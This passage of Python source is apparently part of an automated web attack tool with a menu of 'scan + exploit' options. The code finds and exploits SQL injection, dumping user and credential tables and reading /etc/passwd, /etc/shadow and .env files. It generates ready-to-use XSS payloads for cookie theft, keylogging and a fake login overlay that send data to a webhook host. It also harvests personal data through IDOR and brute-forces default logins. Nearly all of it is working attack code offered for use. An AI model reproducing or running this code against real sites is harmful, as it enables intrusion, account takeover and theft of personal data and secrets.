        inf("  Testing API endpoints...")
        for ap in api_paths:
            for rid in ["1","2","3"]:
                ep=f"{ps.scheme}://{ps.netloc}{ap.rstrip('/')}/{rid}"
                rr=req(ep)
                if rr.get("e"): continue
                if rr["s"]==200 and rr["l"]>100:
                    check_idor(ep,f"api[{ap}/{rid}]",rr,extra=ep)

    print(f"\r{' '*70}\r",end="")
    if rs:
        inf(f"  {C.R}Exploiting IDOR...{C.X}")
        exp_data=exp_idor(url,method)
        for r in rs: r["exploit"]=exp_data
    return rs

def s_auth(url):
    rs=[]
    inf(f"Scanning auth bypass on: {C.BO}{url}{C.X}")
    print(f"{C.D}{'─'*70}{C.X}")
    req(url,method="POST",data={"username":"user","password":"wrongpassword123"},stealth=False)
    lf=[{"username":"user","password":"pass"},{"user":"user","pass":"pass"},
        {"login":"user","password":"pass"},{"email":"user","password":"pass"},
        {"username":"user","password":"pass"},{"email":"user@user.com","password":"pass"}]
    for pl in SQLI["auth"]:
        for fd in lf:
            dt={k:pl if k in ["username","user","login","email"] else v for k,v in fd.items()}
            pre_cookies=dict(st.all_cookies())
            rr=req(url,method="POST",data=dt)
            if rr and not rr.get("e") and rr["s"] in [200,302,301]:
                proofs=auth_verify(url,dt,rr,pre_cookies)
                if len(proofs)>=2:
                    vln(f"  Auth bypass: {C.Y}{pl}{C.X}")
                    for p in proofs:
                        inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
                    rs.append({"type":"Auth Bypass","severity":"critical",
                               "param":"N/A","payload":pl,"status":rr["s"],
                               "proofs":proofs})
                    break
        else: continue
        break
    print(f"\r{' '*70}\r",end="")
    if rs:
        inf(f"  {C.R}Exploiting Auth Bypass...{C.X}")
        exp_data=exp_auth(url)
        for r in rs: r["exploit"]=exp_data
    return rs

def fp(url):
    inf(f"Fingerprinting: {C.BO}{url}{C.X}")
    rr=gbase(url)
    if rr.get("e"): err(f"  Cannot reach: {rr['e']}"); return{}
    fp={"server":rr["h"].get("Server",""),"powered":rr["h"].get("X-Powered-By",""),"cms":det_cms(rr["c"]),"waf":det_waf(rr["c"],rr["h"],rr["s"])}
    inf(f"  Status: {rr['s']} | Length: {rr['l']} | Time: {rr['t']:.2f}s")
    if fp["server"]: inf(f"  Server: {fp['server']}")
    if fp["powered"]: inf(f"  X-Powered-By: {fp['powered']}")
    if fp["cms"]: inf(f"  CMS: {', '.join(fp['cms'])}")
    if fp["waf"]:
        for w in fp["waf"]: wrn(f"  WAF: {w}")
    return fp

def auto(url):
    rs=[]
    print(f"\n{C.BO}{C.B}{'═'*70}{C.X}")
    print(f"{C.BO}{C.CY}  Target: {C.W}{url}{C.X}")
    print(f"{C.BO}{C.CY}  Time:   {C.W}{time.strftime('%Y-%m-%d %H:%M:%S')}{C.X}")
    print(f"{C.BO}{C.B}{'═'*70}{C.X}\n")
    fp2=fp(url)
    if st.req_count<=1:
        st.pre_browse(url)
    ps=eparams(url); tp=ps if ps else [None]
    for p in tp:
        if p: inf(f"Parameter: {C.M}{p}{C.X}")
        rs.extend(s_sqli(url,param=p))
        rs.extend(s_xss(url,param=p))
        rs.extend(s_extra(url,param=p))
    rs.extend(s_idor(url))
    rs.extend(s_auth(url))
    return rs,fp2

def exp_sqli(url,method="GET",param=None,found=None):
    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
    print(f"{C.BO}{C.R}  SQLi Exploitation{C.X}")
    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")

    def try_pl(pl):
        r=tpay(url,pl,method,param)
        return r if r and not r.get("e") else None

    def find_cols():
        for n in range(1,21):
            r=try_pl(f"' ORDER BY {n} --")
            if not r: continue
            if det_err(r["c"]) or r["s"]==500: return n-1
        return None

    def u_extract(payload,marker="ALFARZDQ"):
        r=try_pl(payload)
        if not r: return None
        i=r["c"].find(marker)
        if i==-1: return None
        j=r["c"].find(marker,i+len(marker))
        return r["c"][i+len(marker):j].strip() if j!=-1 else r["c"][i:i+200]

    def blind_extract(query,max_len=60):
        result=""
        true_r=try_pl("' AND 1=1 --")
        false_r=try_pl("' AND 1=2 --")
        if not true_r or not false_r: return ""
        true_l, false_l = true_r["l"], false_r["l"]
        if true_l==false_l:
            true_r=try_pl("' AND 'a'='a' --")
            false_r=try_pl("' AND 'a'='b' --")
            if true_r and false_r: true_l, false_l = true_r["l"], false_r["l"]
            else: return ""
        for pos in range(1,max_len+1):
            low,high=32,126
            ch=None
            for _ in range(7):
                mid=(low+high)//2
                r=try_pl(f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid} --")
                if r and abs(r["l"]-true_l)<abs(r["l"]-false_l):
                    low=mid+1
                else:
                    high=mid
            if low==high and 32<=low<=126:
                ch=chr(low)
                result+=ch
                print(f"\r    {C.G}Extracting: {C.X}{result}",end="",flush=True)
            else:
                break
        print()
        return result

    def error_extract(query):
        r=try_pl(f"' AND 1=CONVERT(int,({query})) --")
        if r:
            er=det_err(r["c"])
            if er: return r["c"][:300]
        r=try_pl(f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}))) --")
        if r:
            m=re.search(r'XPATH[^:]*:\s*(.+?)(?:</|$)',r["c"])
            if m: return m.group(1)
        r=try_pl(f"' AND UPDATEXML(1,CONCAT(0x7e,({query})),1) --")
        if r:
            m=re.search(r'XPATH[^:]*:\s*(.+?)(?:</|$)',r["c"])
            if m: return m.group(1)
        return None

    def dump_table(db,table,columns,limit=20):
        rows=[]
        nulls=",".join(["NULL"]*max(cols-1,0)) if cols else ""
        concat="CONCAT(0x414c46,'||',"+",".join(f"'{c}:',IFNULL({c},'NULL'),','" for c in columns)+",'||',0x414c46)"
        if cols:
            pl=f"' UNION SELECT {concat},{nulls} FROM {db}.{table if db else table} LIMIT {limit} --"
        else:
            pl=f"' UNION SELECT {concat} FROM {db}.{table if db else table} LIMIT {limit} --"
        r=try_pl(pl)
        if r:
            for block in re.finditer(r'ALF\|\|(.+?)\|\|ALF',r["c"]):
                row={}
                for pair in block.group(1).split(","):
                    if ":" in pair:
                        k,v=pair.split(":",1)
                        row[k.strip()]=v.strip()
                if row: rows.append(row)
        if not rows:
            for block in re.finditer(r'~([^~]{5,300})~',r["c"] if r else ""):
                row={"data":block.group(1)}
                rows.append(row)
        return rows

    cols=find_cols() or 0
    if cols: ok(f"  Columns: {C.BO}{cols}{C.X}")
    else: inf("  Column count unknown, using fallback methods")

    print(f"\n  {C.BO}{C.Y}[1/6] Version & Database{C.X}")
    db_info={}
    if cols:
        for pl in [f"' UNION SELECT @@version,{','.join(['NULL']*(cols-1))} --",
                   f"' UNION SELECT {','.join(['NULL']*(cols-1))},@@version --"]:
            r=try_pl(pl)
            if r:
                m=re.search(r'(\d+\.\d+\.\d+[^\s<"]{0,30})',r["c"])
                if m: db_info["version"]=m.group(1); break
    if not db_info.get("version"):
        v=error_extract("SELECT @@version")
        if v: db_info["version"]=v[:100]
    if not db_info.get("version"):
        v=blind_extract("SELECT @@version")
        if v: db_info["version"]=v

    for target in ["database()","user()","@@hostname","@@datadir"]:
        if cols:
            for pl in [f"' UNION SELECT {target},{','.join(['NULL']*(cols-1))} --",
                       f"' UNION SELECT {','.join(['NULL']*(cols-1))},{target} --"]:
                r=try_pl(pl)
                if r:
                    m=re.search(r'(?<![a-zA-Z0-9_])([a-zA-Z0-9_./@-]{3,50})(?![a-zA-Z0-9_])',r["c"])
                    if m and m.group(1) not in ["NULL","null","select","UNION"]:
                        db_info[target.replace("@","").replace("()","")]=m.group(1); break
        if target.replace("@","").replace("()","") not in db_info:
            v=blind_extract(f"SELECT {target}")
            if v: db_info[target.replace("@","").replace("()","")]=v

    for k,v in db_info.items():
        ok(f"  {k}: {C.BO}{C.G}{v}{C.X}")

    print(f"\n  {C.BO}{C.Y}[2/6] Schema Discovery{C.X}")
    schemas=[]
    tables=[]
    if cols:
        pl=f"' UNION SELECT GROUP_CONCAT(schema_name),{','.join(['NULL']*(cols-1))} FROM information_schema.schemata --"
        r=try_pl(pl)
        if r:
            schemas=[s.strip() for s in r["c"].split(",") if len(s.strip())>2 and s.strip().lower() not in ["null","select","from","information_schema"]]
            schemas=[s for s in schemas if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$',s)]
    if not schemas:
        v=blind_extract("SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata")
        if v: schemas=[s.strip() for s in v.split(",") if s.strip()]
    if schemas:
        ok(f"  Schemas: {C.BO}{', '.join(schemas[:15])}{C.X}")

    target_db=db_info.get("database","") or (schemas[0] if schemas else "")
    if cols:
        pl=f"' UNION SELECT GROUP_CONCAT(table_name),{','.join(['NULL']*(cols-1))} FROM information_schema.tables WHERE table_schema='{target_db}' --"
        if not target_db: pl=f"' UNION SELECT GROUP_CONCAT(table_name),{','.join(['NULL']*(cols-1))} FROM information_schema.tables WHERE table_schema=database() --"
        r=try_pl(pl)
        if r:
            tables=[t.strip() for t in r["c"].split(",") if len(t.strip())>2 and t.strip().lower() not in ["null","select","from","group_concat"]]
            tables=[t for t in tables if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$',t)]
    if not tables:
        v=blind_extract("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
        if v: tables=[t.strip() for t in v.split(",") if t.strip()]
    if tables:
        ok(f"  Tables ({len(tables)}):")
        for t in tables[:25]: print(f"    {C.G}*{C.X} {t}")

    print(f"\n  {C.BO}{C.Y}[3/6] Interesting Table Hunt{C.X}")
    interesting=["users","accounts","members","customers","admins","employees",
                 "login","credentials","passwords","profiles","orders","transactions",
                 "payments","sessions","tokens","api_keys","config","settings"]
    target_table=None
    for it in interesting:
        if any(it==t.lower() for t in tables):
            target_table=[t for t in tables if t.lower()==it][0]
            break
    if not target_table and tables: target_table=tables[0]

    col_names=[]
    if target_table:
        ok(f"  Target: {C.BO}{target_table}{C.X}")
        if cols:
            pl=f"' UNION SELECT GROUP_CONCAT(column_name),{','.join(['NULL']*(cols-1))} FROM information_schema.columns WHERE table_name='{target_table}' --"
            r=try_pl(pl)
            if r:
                col_names=[c.strip() for c in r["c"].split(",") if len(c.strip())>2 and c.strip().lower() not in ["null","select","from"]]
                col_names=[c for c in col_names if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$',c)]
        if not col_names:
            v=blind_extract(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{target_table}'")
            if v: col_names=[c.strip() for c in v.split(",") if c.strip()]
        if col_names:
            ok(f"  Columns: {', '.join(col_names[:15])}")

    print(f"\n  {C.BO}{C.Y}[4/6] Data Dump{C.X}")
    dumped_rows=[]
    if target_table and col_names and cols:
        rows=dump_table(target_db,target_table,col_names,20)
        if rows:
            ok(f"  {len(rows)} rows from {target_table}:")
            for row in rows[:20]:
                line=" | ".join(f"{k}={v}" for k,v in row.items())
                print(f"    {C.R}{line[:120]}{C.X}")
                dumped_rows.append(row)
    if not dumped_rows and target_table and cols:
        data_cols=[c for c in col_names if c.lower() in ["password","pass","pwd","hash","token",
                   "secret","email","username","name","phone","credit_card","ssn","salary","balance","id"]]
        if not data_cols: data_cols=col_names[:3]
        for dc in data_cols[:3]:
            pl=f"' UNION SELECT {dc},{','.join(['NULL']*(cols-1))} FROM {target_db+'.' if target_db else ''}{target_table} LIMIT 10 --"
            r=try_pl(pl)
            if r:
                vals=re.findall(r'(?<![a-zA-Z0-9_$])([a-zA-Z0-9._%+-]{4,80})(?![a-zA-Z0-9_])',r["c"])
                vals=[v for v in vals if v.lower() not in ["null","select","union","from","where","and","table","none","limit"]]
                if vals:
                    ok(f"  {dc}: {', '.join(vals[:10])}")
                    dumped_rows.append({dc:vals})
    if not dumped_rows and target_table:
        for dc in col_names[:3]:
            v=blind_extract(f"SELECT {dc} FROM {target_table} LIMIT 1")
            if v: ok(f"  {dc} (blind): {C.R}{v}{C.X}"); dumped_rows.append({dc:v})

    print(f"\n  {C.BO}{C.Y}[5/6] File Read / Stacked Queries{C.X}")
    file_contents=[]
    for fpath in ["/etc/passwd","/etc/shadow","/proc/self/environ","/var/www/html/.env","/app/.env"]:
        if cols:
            pl=f"' UNION SELECT LOAD_FILE('{fpath}'),{','.join(['NULL']*(cols-1))} --"
            r=try_pl(pl)
            if r and ("root:" in r["c"] or "SECRET" in r["c"] or "DB_" in r["c"] or "APP_" in r["c"] or "PASSWORD" in r["c"].upper()):
                content=r["c"][:500]
                ok(f"  {fpath}:")
                print(f"    {C.R}{content}{C.X}")
                file_contents.append({"path":fpath,"content":content})
                break
    if not file_contents:
        v=blind_extract("SELECT LOAD_FILE('/etc/passwd')",30)
        if v and "root" in v:
            ok(f"  /etc/passwd (blind): {C.R}{v}{C.X}")
            file_contents.append({"path":"/etc/passwd","content":v})
    r=try_pl("'; SELECT SLEEP(1) --")
    if r and r["t"]>=1.5:
        ok(f"  {C.R}Stacked queries supported!{C.X}")
    r=try_pl("'; EXEC xp_cmdshell('echo ALFARZDQ') --")
    if r and "ALFARZDQ" in r.get("c",""):
        ok(f"  {C.R}OS command execution via xp_cmdshell!{C.X}")

    print(f"\n  {C.BO}{C.Y}[6/6] Report{C.X}")
    print(f"  {C.D}{'─'*50}{C.X}")
    ok(f"  DB Version: {db_info.get('version','unknown')}")
    ok(f"  Database: {db_info.get('database','unknown')}")
    ok(f"  User: {db_info.get('user','unknown')}")
    if schemas: ok(f"  Schemas: {len(schemas)}")
    if tables: ok(f"  Tables: {len(tables)}")
    if dumped_rows: ok(f"  Rows dumped: {len(dumped_rows)}")
    if file_contents: ok(f"  Files read: {len(file_contents)}")

    print(f"\n{C.BO}{C.G}  [!] SQLi Exploit Done{C.X}\n")
    return{"db_info":db_info,"schemas":schemas,"tables":tables,"rows":dumped_rows,"files":file_contents}

def exp_xss(url,method="GET",param=None,found=None):
    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
    print(f"{C.BO}{C.R}  XSS Exploitation{C.X}")
    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")

    marker=f"ALFXSS{random.randint(10000,99999)}"

    print(f"  {C.BO}{C.Y}[1/4] Finding Working Payload{C.X}")
    working_pl=None
    working_ctx=None
    test_pls=[
        f"<script>document.write('{marker}')</script>",
        f"<img src=x onerror=document.write('{marker}')>",
        f"<svg onload=document.write('{marker}')>",
        f"'><script>document.write('{marker}')</script>//",
        f"\"><img src=x onerror=document.write('{marker}')>",
        f"<body onload=document.write('{marker}')>",
        f"<details open ontoggle=document.write('{marker}')>",
        f"<marquee onstart=document.write('{marker}')>",
        f"<input onfocus=document.write('{marker}') autofocus>",
        f"<video><source onerror=document.write('{marker}')>",
        f"<select onchange=document.write('{marker}') autofocus><option>1</option></select>",
    ]
    for pl in test_pls:
        r=tpay(url,pl,method,param)
        if r and marker in r["c"]:
            working_pl=pl
            ctxs=xss_context(r["c"],marker)
            working_ctx=ctxs[0] if ctxs else {"type":"unknown","safe":True}
            ok(f"  Working: {C.BO}{pl[:60]}{C.X}")
            ok(f"  Context: {working_ctx['desc']}")
            break
    if not working_pl:
        wrn("  Direct payloads filtered, trying bypasses...")
        for pl in test_pls[:5]:
            for enc in [urllib.parse.quote(pl),urllib.parse.quote(pl,safe=""),
                       pl.replace("<","%3C").replace(">","%3E"),
                       pl.replace("<","\\u003c").replace(">","\\u003e"),
                       pl.replace("script","scr<script>ipt").replace("</script>","</scr</script>ipt")]:
                r=tpay(url,enc,method,param)
                if r and marker in r["c"]:
                    working_pl=enc; ok(f"  Working (encoded): {enc[:60]}")
                    break
            if working_pl: break
    if not working_pl:
        wrn("  No XSS execution confirmed")
        return None

    print(f"\n  {C.BO}{C.Y}[2/4] Generating Exploit Payloads{C.X}")
    hook="https://WEBHOOK_URL"
    exploits=[]
    exploits.append(("Cookie Theft",
        f"<script>new Image().src='{hook}/c?d='+document.cookie+'%26u='+document.location</script>",
        "Steals all cookies + URL"))
    exploits.append(("Session Hijack",
        f"<script>fetch('{hook}/s?c='+btoa(document.cookie))</script>",
        "Base64 encoded session exfiltration"))
    exploits.append(("Keylogger",
        f"<script>var k='';document.onkeypress=function(e){{k+=e.key;if(k.length>15){{new Image().src='{hook}/k?d='+btoa(k);k=''}}}}</script>",
        "Captures all keystrokes"))
    exploits.append(("Phishing Overlay",
        f"<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center'><div style='background:white;padding:30px;border-radius:8px'><h3>Session Expired</h3><input id=u placeholder=Username style='display:block;margin:8px 0;padding:8px;width:250px'><input id=p type=password placeholder=Password style='display:block;margin:8px 0;padding:8px;width:250px'><button onclick=\"new Image().src='{hook}/ph?d='+document.getElementById('u').value+':'+document.getElementById('p').value\" style='padding:8px 20px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer'>Login</button></div></div>",
        "Fake login overlay"))
    exploits.append(("Page Source Dump",
        f"<script>new Image().src='{hook}/src?d='+btoa(document.documentElement.innerHTML)</script>",
        "Dumps entire page HTML"))
    exploits.append(("Admin Probe",
        f"<script>var x=new XMLHttpRequest();x.open('GET','/admin');x.onload=function(){{new Image().src='{hook}/a?d='+btoa(x.responseText)}};x.send()</script>",
        "Fetches admin page content"))
    exploits.append(("Internal Network Scan",
        f"<script>['/api/users','/api/admin','/api/config','/api/keys','/api/internal'].forEach(function(p){{var x=new XMLHttpRequest();x.open('GET',p);x.onload=function(){{new Image().src='{hook}/net?p='+p+'&d='+btoa(x.responseText.substring(0,500))}};x.send()}})</script>",
        "Probes internal API endpoints"))
    exploits.append(("Form Hijack",
        f"<script>document.forms.forEach(function(f){{f.addEventListener('submit',function(e){{e.preventDefault();new Image().src='{hook}/form?d='+btoa(JSON.stringify(Object.fromEntries(new FormData(f))))}})}})</script>",
        "Intercepts all form submissions"))

    print(f"\n  {C.BO}{C.G}Ready-to-use Exploit URLs:{C.X}\n")
    for name,payload,impact in exploits:
        print(f"  {C.R}[{name}]{C.X}")
        print(f"  {C.D}Impact: {impact}{C.X}")
        enc_pl=urllib.parse.quote(payload)
        if param:
            if method=="POST":
                print(f"  curl -X POST '{url}' -d '{param}={enc_pl[:200]}'")
            else:
                sep="&" if "?" in url else "?"
                print(f"  {url}{sep}{param}={enc_pl[:200]}")
        print(f"  {C.D}{'─'*60}{C.X}")

    print(f"\n  {C.BO}{C.Y}[3/4] CORS & PostMessage Probe{C.X}")
    r=req(url,method=method,hdrs={"Origin":"https://evil.com"},stealth=False)
    if r:
        acao=r["h"].get("Access-Control-Allow-Origin","")
        acac=r["h"].get("Access-Control-Allow-Credentials","")
        if "*" in acao or "evil.com" in acao:
            ok(f"  {C.R}CORS misconfiguration: ACAO={acao} ACAC={acac}{C.X}")
            exploits.append(("CORS Theft",
                f"<script>fetch('{url}',{{credentials:'include'}}).then(r=>r.text()).then(t=>new Image().src='{hook}/cors?d='+btoa(t)))</script>",
                "CORS allows evil.com origin"))
        if "postMessage" in r["c"]:
            wrn("  postMessage detected in page - potential DOM sink")
            exploits.append(("PostMessage Abuse",
                f"<script>window.addEventListener('message',function(e){{new Image().src='{hook}/pm?d='+btoa(e.data)}})</script>",
                "Listens for leaked postMessages"))

    print(f"\n  {C.BO}{C.Y}[4/4] Summary{C.X}")
    ok(f"  Working payload: {working_pl[:60]}")
    ok(f"  Injection context: {working_ctx.get('desc','unknown')}")
    ok(f"  Exploit variants: {len(exploits)}")

    print(f"\n{C.BO}{C.G}  [!] XSS Exploit Done{C.X}\n")
    return{"working_payload":working_pl,"context":working_ctx,"exploits":exploits}

def exp_idor(url,method="GET"):
    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
    print(f"{C.BO}{C.R}  IDOR Exploitation Module{C.X}")
    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")

    ps=urlparse(url)
    pq=parse_qs(ps.query)

    ip=[k for k in pq if any(x in k.lower() for x in IDOR_NAMES)]
    if not ip: ip=list(pq.keys())

    for ip2 in ip:
        print(f"{C.BO}  Exploiting parameter: {ip2}{C.X}\n")

        br=req(url,stealth=False)
        if br.get("e"): err("Cannot reach target"); continue
        base_hash=content_hash(br["c"])
        base_len=br["l"]

        print(f"  {C.BO}{C.Y}[Phase 1] Sequential ID Scan (1-50){C.X}")
        print(f"  {C.D}{'─'*50}{C.X}")
        found=[]
        for vid in range(1,51):
            tp=dict(pq); tp[ip2]=[str(vid)]
            tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
            rr=req(tu)
            if rr.get("e"): continue
            if rr["s"]==200 and rr["l"]>100:
                h=content_hash(rr["c"])
                if h!=base_hash or rr["l"]!=base_len:
                    emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',rr["c"])
                    phones=re.findall(r'[\+]?[0-9]{1,3}[-.\s]?[0-9]{3}[-.\s]?[0-9]{3,4}[-.\s]?[0-9]{4}',rr["c"])
                    names=re.findall(r'<(?:strong|b|h[1-6]|span|td|div)[^>]*>\s*([A-Z][a-z]+(?:\s+[A-Z][a-z]+)*)\s*</',rr["c"])
                    amounts=re.findall(r'[\$€£]\s*[\d,]+\.?\d*',rr["c"])
                    data={"id":vid,"url":tu,"len":rr["l"],"hash":h[:8],
                          "emails":emails[:3],"phones":phones[:2],
                          "names":names[:3],"amounts":amounts[:3]}
                    found.append(data)
                    preview=""
                    if data["emails"]: preview+=f" email={','.join(data['emails'])}"
                    if data["names"]: preview+=f" name={','.join(data['names'])}"
                    if data["amounts"]: preview+=f" amount={','.join(data['amounts'])}"
                    if data["phones"]: preview+=f" phone={','.join(data['phones'])}"
                    print(f"    {C.G}[{vid}]{C.X} {rr['l']}b{C.D}{preview}{C.X}")
            print(f"\r    Scanning... {vid}/50",end="",flush=True)
        print(f"\r    {' '*40}")

        print(f"\n  {C.BO}{C.Y}[Phase 2] Extended Range (100-200, 500, 1000){C.X}")
        print(f"  {C.D}{'─'*50}{C.X}")
        for vid in list(range(100,201,10))+[500,1000]:
            tp=dict(pq); tp[ip2]=[str(vid)]
            tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
            rr=req(tu)
            if rr.get("e"): continue
            if rr["s"]==200 and rr["l"]>100:
                h=content_hash(rr["c"])
                if h!=base_hash:
                    emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',rr["c"])
                    if emails:
                        print(f"    {C.R}[{vid}]{C.X} email={','.join(emails[:3])}")
                        found.append({"id":vid,"url":tu,"emails":emails[:3]})

        if found:
            print(f"\n  {C.BO}{C.G}[!] Data Extraction Summary{C.X}")
            print(f"  {C.D}{'─'*50}{C.X}")
            all_emails=set()
            all_names=set()
            all_amounts=set()
            for f in found:
                all_emails.update(f.get("emails",[]))
                all_names.update(f.get("names",[]))
                all_amounts.update(f.get("amounts",[]))
            if all_emails:
                print(f"  {C.R}Emails found ({len(all_emails)}):{C.X}")
                for e in sorted(all_emails)[:20]:
                    print(f"    {C.G}*{C.X} {e}")
            if all_names:
                print(f"  {C.R}Names found ({len(all_names)}):{C.X}")
                for n in sorted(all_names)[:20]:
                    print(f"    {C.G}*{C.X} {n}")
            if all_amounts:
                print(f"  {C.R}Amounts found ({len(all_amounts)}):{C.X}")
                for a in sorted(all_amounts)[:20]:
                    print(f"    {C.G}*{C.X} {a}")
            print(f"\n  Total accessible records: {C.BO}{len(found)}{C.X}")
            ok(f"  IDs accessible: {', '.join(str(f['id']) for f in found[:30])}")
        else:
            wrn("  No data extracted from sequential scan")

    print(f"\n{C.BO}{C.G}  [!] IDOR Exploitation Complete{C.X}\n")
    return found

def exp_auth(url):
    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
    print(f"{C.BO}{C.R}  Auth Bypass Exploitation Module{C.X}")
    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")

    ps=urlparse(url)
    base=f"{ps.scheme}://{ps.netloc}"

    print(f"{C.BO}{C.Y}  [Phase 1] Login Brute Force with SQLi{C.X}")
    print(f"  {C.D}{'─'*50}{C.X}")

    lf=[{"username":"user","password":"pass"},
        {"user":"user","pass":"pass"},
        {"login":"user","password":"pass"},
        {"email":"user","password":"pass"},
        {"username":"admin","password":"admin"},
        {"email":"admin@site.com","password":"admin"}]

    sessions=[]
    for pl in SQLI["auth"][:10]:
        for fd in lf:
            dt={k:pl if k in ["username","user","login","email"] else v for k,v in fd.items()}
            pre_ck=dict(st.all_cookies())
            rr=req(url,method="POST",data=dt)
            if rr.get("e"): continue
            if rr["s"] in [200,302,301]:
                proofs=auth_verify(url,dt,rr,pre_ck)
                if len(proofs)>=2:
                    post_ck=st.all_cookies()
                    new_ck={k:v for k,v in post_ck.items() if k not in pre_ck}
                    sess={"payload":pl,"status":rr["s"],"cookies":new_ck,
                          "proofs":proofs,"response_len":rr["l"]}
                    sessions.append(sess)
                    ok(f"  Auth bypass: {pl[:40]} | Status: {rr['s']}")
                    for p in proofs:
                        inf(f"    [{p['method']}] {p['evidence']}")
                    break
        if sessions: break

    if not sessions:
        wrn("  No auth bypass found with standard payloads")
        print(f"\n  {C.BO}{C.Y}Trying common credentials...{C.X}")
        creds=[("admin","admin"),("admin","password"),("admin","admin123"),
               ("admin","root"),("root","root"),("admin","123456"),
               ("admin","admin@123"),("administrator","administrator"),
               ("admin","P@ssw0rd"),("admin","toor"),("test","test"),
               ("user","user"),("demo","demo"),("guest","guest")]
        for u,p in creds:
            for fd in lf:
                dt={k:(u if k in ["username","user","login","email"] else p) for k,v in fd.items()}
                pre_ck=dict(st.all_cookies())
                rr=req(url,method="POST",data=dt)
                if rr.get("e"): continue
                if rr["s"] in [200,302,301]:
                    proofs=auth_verify(url,dt,rr,pre_ck)
                    if len(proofs)>=1:
                        post_ck=st.all_cookies()
                        new_ck={k:v for k,v in post_ck.items() if k not in pre_ck}
                        sessions.append({"payload":f"{u}:{p}","status":rr["s"],
                                        "cookies":new_ck,"proofs":proofs,"response_len":rr["l"]})
                        ok(f"  Credential: {u}:{p} | Status: {rr['s']}")
                        break
            if sessions: break

    if sessions:
        sess=sessions[0]
        print(f"\n{C.BO}{C.Y}  [Phase 2] Post-Auth Access{C.X}")
        print(f"  {C.D}{'─'*50}{C.X}")

        endpoints=["/admin","/dashboard","/profile","/api/user","/api/users",
                   "/api/me","/api/admin","/panel","/manage","/settings",
                   "/admin/users","/admin/dashboard","/user/profile",
                   "/account","/home","/api/v1/user","/api/v1/admin",
                   "/console","/control","/backend","/administrator"]

        accessible=[]
        for ep in endpoints:
            rr=req(base+ep)
            if rr.get("e"): continue
            if rr["s"]==200 and len(rr["c"])>200 and not is_error_page(rr["c"],rr["s"]):
                data_type="unknown"
                if rr["c"].strip().startswith("{") or rr["c"].strip().startswith("["):
                    data_type="JSON"
                elif "<html" in rr["c"].lower():
                    data_type="HTML"
                accessible.append({"endpoint":ep,"status":rr["s"],
                                   "length":rr["l"],"type":data_type})
                ok(f"  {ep} -> {rr['s']} ({rr['l']}b, {data_type})")

        if accessible:
            print(f"\n{C.BO}{C.Y}  [Phase 3] Data Harvest{C.X}")
            print(f"  {C.D}{'─'*50}{C.X}")
            for acc in accessible:
                rr=req(base+acc["endpoint"])
                if rr.get("e"): continue
                emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',rr["c"])
                tokens=re.findall(r'["\']?(?:token|api_?key|secret|session)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9._-]{10,})',rr["c"],re.IGNORECASE)
                users=re.findall(r'"(?:username|user|email|name)"\s*:\s*"([^"]+)"',rr["c"],re.IGNORECASE)
                if emails:
                    ok(f"  Emails from {acc['endpoint']}:")
                    for e in emails[:10]: print(f"    {C.G}*{C.X} {e}")
                if tokens:
                    ok(f"  Tokens/Keys from {acc['endpoint']}:")
                    for t in tokens[:5]: print(f"    {C.R}*{C.X} {t[:50]}")
                if users:
                    ok(f"  Usernames from {acc['endpoint']}:")
                    for u in users[:10]: print(f"    {C.G}*{C.X} {u}")

        print(f"\n  {C.BO}Session Info:{C.X}")
        for k,v in sess.get("cookies",{}).items():
            print(f"    Cookie: {C.G}{k}={v[:40]}{C.X}")
    else:
        wrn("  No authentication bypass achieved")

    print(f"\n{C.BO}{C.G}  [!] Auth Exploitation Complete{C.X}\n")
    return sessions

def menu():
    menu_title = f"{C.CY}Al-Shammari - Main Menu{C.X}"
    menu_lines = [
        f"{C.G}1.{C.X}  Full Scan + Exploit (All Payloads)",
        f"{C.G}2.{C.X}  SQLi Scan + Exploit",
        f"{C.G}3.{C.X}  XSS Scan + Exploit",
        f"{C.G}4.{C.X}  IDOR Scan + Exploit",
        f"{C.G}5.{C.X}  Auth Bypass Scan + Exploit",
        f"{C.G}6.{C.X}  Extra Payloads Scan (NoSQL + SSTI + CMDI + XXE)",
        f"{C.G}7.{C.X}  Custom Payload Test",
        f"{C.G}8.{C.X}  Database-Specific SQLi + Exploit",
        f"{C.G}9.{C.X}  Fingerprint Target",
        f"{C.G}10.{C.X} Batch Scan + Exploit (from file)",
        f"{C.G}0.{C.X}  Exit",
    ]
    while True:
        banner()
        print("\n" + box(menu_lines, menu_title) + "\n")
        try:
            ch=input(f"{C.BO}{C.CY}[?] Select option: {C.X}").strip()
        except KeyboardInterrupt:
            print(f"\n{C.Y}[!]{C.X} Interrupted by user")
            break
        if ch=="1":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            if not u: err("URL required"); continue
            rs,_=auto(u); pres(rs)
        elif ch=="2":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
